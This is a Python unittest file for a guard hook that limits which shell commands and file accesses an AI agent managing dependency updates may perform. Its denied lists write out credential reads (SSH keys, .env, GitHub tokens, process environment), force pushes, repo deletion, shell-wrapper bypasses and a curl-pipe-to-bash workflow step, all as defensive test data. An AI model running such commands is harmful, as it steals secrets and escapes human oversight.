#!/usr/bin/env python3
"""Tests für .claude/hooks/guard.py.

Jeder Fall schickt einen Tool-Aufruf als JSON an den Hook und prüft, ob er erlaubt (Exit 0) oder
blockiert (Exit 2) wird. Läuft in einem temporären Projektverzeichnis, das echte workspace/ bleibt unberührt.

    python3 -m unittest discover tests
"""
import json
import os
import subprocess
import tempfile
import unittest
from pathlib import Path

GUARD = Path(__file__).resolve().parent.parent / ".claude" / "hooks" / "guard.py"

BASE_WORKFLOW = """\
name: CI
on:
  pull_request:
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - run: sudo apt-get install libssl-dev
      - run: cargo test
"""

# Branch-Name -> Funktion, die den Basis-Workflow verändert (None = Datei löschen)
WORKFLOW_BRANCHES_ALLOWED = {
    "wf-bump-action": lambda w: w.replace("actions/checkout@v2", "actions/checkout@v4"),
    "wf-apt-update": lambda w: w.replace("sudo apt-get install", "sudo apt-get update && sudo apt-get install -y"),
    "wf-new-step": lambda w: w + "      - run: cargo +nightly build\n",
}
WORKFLOW_BRANCHES_DENIED = {
    "wf-secret": lambda w: w + "      - run: echo ${{ secrets.DEPLOY_KEY }}\n",
    "wf-token": lambda w: w + "        env:\n          GH_TOKEN: ${{ github.token }}\n",
    "wf-trigger": lambda w: w.replace("  pull_request:\n", "  pull_request_target:\n"),
    "wf-add-push": lambda w: w.replace("  pull_request:\n", "  pull_request:\n  push:\n"),
    "wf-perm-write": lambda w: w.replace("contents: read", "contents: write"),
    "wf-perm-removed": lambda w: w.replace("permissions:\n  contents: read\n", ""),
    "wf-curl-sh": lambda w: w + "      - run: curl -sSL https://example.com/x.sh | bash\n",
    "wf-injection": lambda w: w + "      - run: echo \"${{ github.event.pull_request.title }}\"\n",
    "wf-delete": None,
}

GIT_ENV = {
    "GIT_CONFIG_GLOBAL": os.devnull,
    "GIT_CONFIG_NOSYSTEM": "1",
    "GIT_AUTHOR_NAME": "Test",
    "GIT_AUTHOR_EMAIL": "test@example.com",
    "GIT_COMMITTER_NAME": "Test",
    "GIT_COMMITTER_EMAIL": "test@example.com",
}

ALLOWED_BASH = [
    "gh repo clone surt91/autosnake workspace/autosnake",
    "gh api --paginate --slurp 'repos/surt91/x/dependabot/alerts?state=open'",
    "gh api -X GET search/issues -f q=foo",
    "gh api repos/surt91/x/issues/3/assignees -f 'assignees[]=surt91'",
    "gh api repos/surt91/x/pulls/3/requested_reviewers -f 'reviewers[]=surt91'",
    "gh api graphql -f query='{ viewer { login } }'",
    "gh pr create -R surt91/x --head dependabotbot/a --body-file workspace/x.pr-body.md --assignee surt91",
    "gh pr comment 3 -R surt91/x --body '@dependabot rebase'",
    "gh pr list -R surt91/x --json number",
    "gh auth status",
    "gh --version",
    "mkdir -p workspace/x/src && cp a b",
    "cd workspace/x && cargo update -p tokio --precise 1.45.1 && cargo test",
    "python3 scripts/list-alerts.py > workspace/status.json",
    "grep -l 'fetch-metadata\\|merge --auto' workspace/x/.github/workflows/*",
    "env FOO=1 npm test",
    "git -C workspace/x checkout -B dependabotbot/security-2026-09-29 origin/main",
    "git -C workspace/x config user.name Test",
    "git -C workspace/x remote set-head origin --auto",
    "timeout 540 gh run watch 123 -R surt91/x --exit-status > /dev/null",
    "gh run view 123 -R surt91/x --log-failed | tail -n 150",
    "gh run list -R surt91/x --branch dependabotbot/a --json status,conclusion",
    "gh run download 123 -R surt91/x -n cypress-artifacts -D workspace/artifacts/x-123",
    "cd workspace && gh run download 123 -R surt91/x -D artifacts/x-123",
    "gh pr ready 5 -R surt91/x --undo",
    "sleep 30",
    "rustup toolchain install nightly --profile minimal",
    "cd workspace/x && cargo +nightly test --lib",
    # Umleitungen dürfen nicht als Argumente gelesen werden
    "git -C workspace/testrepo push -u origin dependabotbot/ok 2>&1",
    "git -C workspace/testrepo push -u origin dependabotbot/ok 2>&1 | tail -5",
    "git -C workspace/testrepo push -u origin dependabotbot/ok > /tmp/push.log 2>&1",
    "git -C workspace/testrepo push -u origin dependabotbot/ok &> /tmp/push.log",
    "git -C workspace/testrepo push -u origin dependabotbot/ok >>/tmp/push.log 2>/dev/null",
    "git -C workspace/testrepo push -u origin dependabotbot/ok>/tmp/push.log",
    "gh pr comment 3 -R surt91/x --body 'a > b && c; d | e'",
    "gh pr comment 3 -R surt91/x --body \"It's fine\"",
]

DENIED_BASH = [
    # Pushes
    "git push origin main",
    "git push",
    "git push origin HEAD",
    "git push -f origin dependabotbot/x",
    "git push -uf origin dependabotbot/x",
    "git push origin +dependabotbot/x",
    "git push origin :dependabotbot/x",
    "git push --delete origin dependabotbot/x",
    "git push --force-with-lease origin dependabotbot/x",
    "git push --mirror origin",
    "git push upstream dependabotbot/x",
    "git push origin dependabotbot/x:main",
    "git push origin dependabotbot/x:refs/heads/main",
    "cd workspace/x && git push origin master",
    # git-Konfiguration und Remotes
    "git -c credential.helper=store push origin dependabotbot/x",
    "git remote set-url origin https://example.com/x",
    "git remote add evil https://example.com/x",
    "git config --global user.name x",
    "git clone git@github.com:someorg/x",
    "git clone https://github.com/someorg/x",
    # gh
    "gh pr merge 3 -R surt91/x",
    "gh pr close 3 -R surt91/x",
    "gh pr review 3 --approve",
    "gh auth token",
    "gh auth status -t",
    "gh auth login --with-token",
    "gh repo delete surt91/x --yes",
    "gh repo edit surt91/x --enable-auto-merge",
    "gh repo clone someoneelse/x",
    "gh secret list",
    "gh workflow run ci.yml",
    # Artefakte nur nach workspace/artifacts/
    "gh run download 123 -R surt91/x",
    "gh run download 123 -R surt91/x -D .",
    "gh run download 123 -R surt91/x -D workspace/x",
    "gh run download 123 -R surt91/x -D workspace/artifacts",
    "gh run download 123 -R surt91/x -D workspace/artifacts/../x",
    "gh run download 123 -R surt91/x -D /tmp/x",
    "cd workspace/x && gh run download 123 -R surt91/x -D workspace/artifacts/y",
    "gh run download 123 -R surt91/x --dir=workspace/artifacts/y",
    "gh run download 123 -R someorg/x -D workspace/artifacts/y",
    "gh run download 123 -D workspace/artifacts/y",
    "gh api -X PATCH repos/surt91/x -F allow_auto_merge=true",
    "gh api repos/surt91/x/pulls -f title=x",
    "gh api -X PUT repos/surt91/x/pulls/3/merge",
    "gh api -X DELETE repos/surt91/x/git/refs/heads/main",
    "gh api --method=POST repos/surt91/x/dependabot/alerts/1",
    "gh api graphql -f query='mutation { mergePullRequest }'",
    # Zugangsdaten und Umgebung
    "cat .env",
    "source .env",
    "echo $GH_TOKEN",
    "printenv",
    "env",
    "export -p",
    "cat ~/.config/gh/hosts.yml",
    "GH_CONFIG_DIR=~/.config/gh gh api user",
    "GIT_CONFIG_GLOBAL=~/.gitconfig git push origin dependabotbot/x",
    "cat ~/.ssh/id_ed25519",
    "python3 -c 'import os; print(os.environ)'",
    "cat /proc/self/environ",
    # Umgehungen
    "bash -c 'git push origin main'",
    "sh -c 'gh pr merge 3'",
    "eval 'git push origin main'",
    "sudo ls",
    "ssh git@github.com",
    "timeout 60 git push origin main",
    "timeout -k 5 60 gh pr merge 3",
    "nice git push origin main",
    "echo main | xargs git push origin",
    "gh run rerun 123",
    # Umleitungen dürfen verbotene Pushes nicht verschleiern
    "git push origin main 2>&1",
    "git push origin 2>&1 main",
    "git push origin main > /dev/null",
    "git push >/dev/null origin main",
    "git push origin dependabotbot/x:main 2>/dev/null",
    "echo $(git push origin main)",
    "true && git push origin main 2>&1 | tail",
    "echo 'unbalanced",
]


def run_guard(tool, tool_input, project, cwd=None, env_overrides=None):
    env = {**os.environ, **GIT_ENV, "CLAUDE_PROJECT_DIR": str(project), "DEPENDABOTBOT_RUN": "1"}
    env.update(env_overrides or {})
    payload = json.dumps({"tool_name": tool, "tool_input": tool_input, "cwd": str(cwd or project)})
    result = subprocess.run(["python3", str(GUARD)], input=payload, capture_output=True, text=True, env=env)
    return result.returncode, result.stderr.strip()


def git(repo, *args):
    subprocess.run(["git", "-C", str(repo), *args], check=True, capture_output=True, env={**os.environ, **GIT_ENV})


class GuardTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls._tmp = tempfile.TemporaryDirectory()
        cls.project = Path(cls._tmp.name).resolve() / "dependabotbot"
        for d in ("workspace", "reports", ".claude"):
            (cls.project / d).mkdir(parents=True)
        (cls.project / ".env").write_text("GH_TOKEN=dummy\n")
        cls._setup_repo()

    @classmethod
    def tearDownClass(cls):
        cls._tmp.cleanup()

    @classmethod
    def _setup_repo(cls):
        """workspace/testrepo mit dependabotbot/ok (normale Änderung) und je einem Branch pro Workflow-Fall."""
        origin = Path(cls._tmp.name) / "origin.git"
        subprocess.run(["git", "init", "-q", "--bare", "-b", "main", str(origin)], check=True, env={**os.environ, **GIT_ENV})
        repo = cls.repo = cls.project / "workspace" / "testrepo"
        subprocess.run(["git", "clone", "-q", str(origin), str(repo)], check=True, capture_output=True,
                       env={**os.environ, **GIT_ENV})
        (repo / "README").write_text("a\n")
        workflow = repo / ".github" / "workflows" / "ci.yml"
        workflow.parent.mkdir(parents=True)
        workflow.write_text(BASE_WORKFLOW)
        git(repo, "add", ".")
        git(repo, "commit", "-qm", "init")
        git(repo, "push", "-q", "origin", "main")
        git(repo, "remote", "set-head", "origin", "--auto")

        git(repo, "checkout", "-qb", "dependabotbot/ok")
        (repo / "Cargo.toml").write_text("b\n")
        git(repo, "add", ".")
        git(repo, "commit", "-qm", "ok")

        for name, change in {**WORKFLOW_BRANCHES_ALLOWED, **WORKFLOW_BRANCHES_DENIED}.items():
            git(repo, "checkout", "-qb", f"dependabotbot/{name}", "main")
            if change is None:
                git(repo, "rm", "-q", str(workflow))
            else:
                workflow.write_text(change(BASE_WORKFLOW))
            git(repo, "commit", "-qam", name)

        git(repo, "checkout", "-qb", "dependabotbot/wf-new-file", "main")
        (workflow.parent / "deploy.yml").write_text("name: Deploy\n")
        git(repo, "add", ".")
        git(repo, "commit", "-qm", "new workflow")

    def assertAllowed(self, tool, tool_input, **kwargs):
        code, err = run_guard(tool, tool_input, self.project, **kwargs)
        self.assertEqual(code, 0, f"sollte erlaubt sein: {tool_input} – {err}")

    def assertDenied(self, tool, tool_input, **kwargs):
        code, err = run_guard(tool, tool_input, self.project, **kwargs)
        self.assertEqual(code, 2, f"sollte blockiert sein: {tool_input}")
        self.assertTrue(err.startswith("dependabotbot-guard:"), err)

    def test_allowed_bash(self):
        for command in ALLOWED_BASH:
            with self.subTest(command=command):
                self.assertAllowed("Bash", {"command": command})

    def test_denied_bash(self):
        for command in DENIED_BASH:
            with self.subTest(command=command):
                self.assertDenied("Bash", {"command": command})

    def test_bash_requires_run_sh(self):
        code, err = run_guard("Bash", {"command": "ls"}, self.project, env_overrides={"DEPENDABOTBOT_RUN": ""})
        self.assertEqual(code, 2)
        self.assertIn("run.sh", err)

    def test_run_rerun(self):
        # gh-Stub liefert je nach Run-ID Branch und Event, unbekannte Runs schlagen fehl
        bindir = self.project.parent / "fake-bin"
        bindir.mkdir(exist_ok=True)
        stub = bindir / "gh"
        stub.write_text(
            "#!/bin/sh\n"
            "case \"$3\" in\n"
            "  1) echo '{\"headBranch\":\"dependabotbot/x\",\"event\":\"pull_request\"}' ;;\n"
            "  2) echo '{\"headBranch\":\"main\",\"event\":\"push\"}' ;;\n"
            "  3) echo '{\"headBranch\":\"dependabot/npm/x\",\"event\":\"pull_request\"}' ;;\n"
            "  5) echo '{\"headBranch\":\"dependabotbot/x\",\"event\":\"push\"}' ;;\n"
            "  *) exit 1 ;;\n"
            "esac\n")
        stub.chmod(0o755)
        env = {"PATH": f"{bindir}{os.pathsep}{os.environ['PATH']}"}
        for command in ["gh run rerun 1 -R surt91/x", "gh run rerun 1 -R surt91/x --failed"]:
            with self.subTest(command=command):
                self.assertAllowed("Bash", {"command": command}, env_overrides=env)
        for command in ["gh run rerun 2 -R surt91/x", "gh run rerun 3 -R surt91/x", "gh run rerun 4 -R surt91/x",
                        "gh run rerun 5 -R surt91/x", "gh run rerun 1 -R surt91/x --debug",
                        "gh run rerun 1 -R someorg/x", "gh run rerun -R surt91/x", "gh run rerun 1"]:
            with self.subTest(command=command):
                self.assertDenied("Bash", {"command": command}, env_overrides=env)

    def test_push_without_workflow_changes(self):
        rel = self.repo.relative_to(self.project)
        self.assertAllowed("Bash", {"command": f"git -C {rel} push -u origin dependabotbot/ok"})
        self.assertAllowed("Bash", {"command": f"cd {rel} && git push -u origin dependabotbot/ok"})
        self.assertAllowed("Bash", {"command": "git push -u origin dependabotbot/ok"}, cwd=self.repo)

    def test_push_with_harmless_workflow_changes(self):
        rel = self.repo.relative_to(self.project)
        for name in WORKFLOW_BRANCHES_ALLOWED:
            with self.subTest(branch=name):
                self.assertAllowed("Bash", {"command": f"git -C {rel} push -u origin dependabotbot/{name}"})

    def test_push_with_risky_workflow_changes(self):
        rel = self.repo.relative_to(self.project)
        for name in [*WORKFLOW_BRANCHES_DENIED, "wf-new-file"]:
            for command, cwd in [
                (f"git -C {rel} push -u origin dependabotbot/{name}", None),
                (f"cd {rel} && git push -u origin dependabotbot/{name}", None),
                (f"git push -u origin dependabotbot/{name}", self.repo),
            ]:
                with self.subTest(branch=name, command=command):
                    code, err = run_guard("Bash", {"command": command}, self.project, cwd=cwd)
                    self.assertEqual(code, 2, f"sollte blockiert sein: {name}")
                    self.assertIn(".github/workflows/", err)

    def test_push_outside_repo_is_denied(self):
        self.assertDenied("Bash", {"command": "git push -u origin dependabotbot/ok"})

    def test_file_tools(self):
        p = self.project
        allowed = [
            ("Write", {"file_path": f"{p}/workspace/x/Cargo.toml"}),
            ("Edit", {"file_path": f"{p}/workspace/x/.github/dependabot.yml"}),
            ("Write", {"file_path": f"{p}/reports/2026-09-29.md"}),
            ("Read", {"file_path": f"{p}/CLAUDE.md"}),
            ("Read", {"file_path": f"{p}/.env.example"}),
            ("Grep", {"path": f"{p}/workspace/x"}),
            ("Glob", {"path": f"{p}/workspace"}),
            ("Edit", {"file_path": f"{p}/workspace/x/.github/workflows/ci.yml"}),
        ]
        denied = [
            ("Read", {"file_path": f"{p}/.env"}),
            ("Read", {"file_path": f"{p}/.gh-config/hosts.yml"}),
            ("Read", {"file_path": os.path.expanduser("~/.ssh/id_ed25519")}),
            ("Read", {"file_path": os.path.expanduser("~/.config/gh/hosts.yml")}),
            ("Write", {"file_path": f"{p}/CLAUDE.md"}),
            ("Edit", {"file_path": f"{p}/.claude/settings.json"}),
            ("Write", {"file_path": f"{p}/.claude/hooks/guard.py"}),
            ("Write", {"file_path": "/tmp/outside.txt"}),
            ("Grep", {"path": str(p)}),
        ]
        for tool, tool_input in allowed:
            with self.subTest(tool=tool, **tool_input):
                self.assertAllowed(tool, tool_input)
        for tool, tool_input in denied:
            with self.subTest(tool=tool, **tool_input):
                self.assertDenied(tool, tool_input)


if __name__ == "__main__":
    unittest.main()
